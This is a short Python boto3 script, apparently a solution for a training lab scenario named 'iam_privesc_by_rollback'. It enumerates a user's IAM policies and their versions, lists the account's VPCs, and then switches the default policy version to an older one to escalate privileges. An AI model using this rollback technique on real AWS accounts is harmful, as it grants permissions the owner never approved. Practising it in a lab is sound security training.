#scene iam_privesc_by_rollback
import boto3
from pprint import pprint


session = boto3.session.Session(profile_name="raynor")
iam_cli = session.client(service_name='iam')
ec2_re = session.resource(service_name='ec2')
response0 = iam_cli.get_user()
response = iam_cli.list_user_policies(UserName='raynor')
response1 = iam_cli.list_users()
response2 = iam_cli.get_user(UserName='raynor')['User']
response3 = iam_cli.list_attached_user_policies(UserName='raynor')['AttachedPolicies']
response4 = iam_cli.get_user_policy(UserName='raynor', PolicyName='cg-raynor-policy')
response5 = iam_cli.list_policy_versions(PolicyArn='arn:aws:iam::567796756587:policy/cg-raynor-policy')['Versions']
response6 = iam_cli.get_policy_version(PolicyArn='arn:aws:iam::567796756587:policy/cg-raynor-policy', VersionId='v1')
for version in response5:
    pprint(iam_cli.get_policy_version(PolicyArn='arn:aws:iam::567796756587:policy/cg-raynor-policy', VersionId=version['VersionId']))

response7 = ec2_re.vpcs.all()
for each_ in response7:
    print(each_)

response8 = iam_cli.set_default_policy_version(PolicyArn='arn:aws:iam::567796756587:policy/cg-raynor-policy', VersionId='v4')
print(response8)
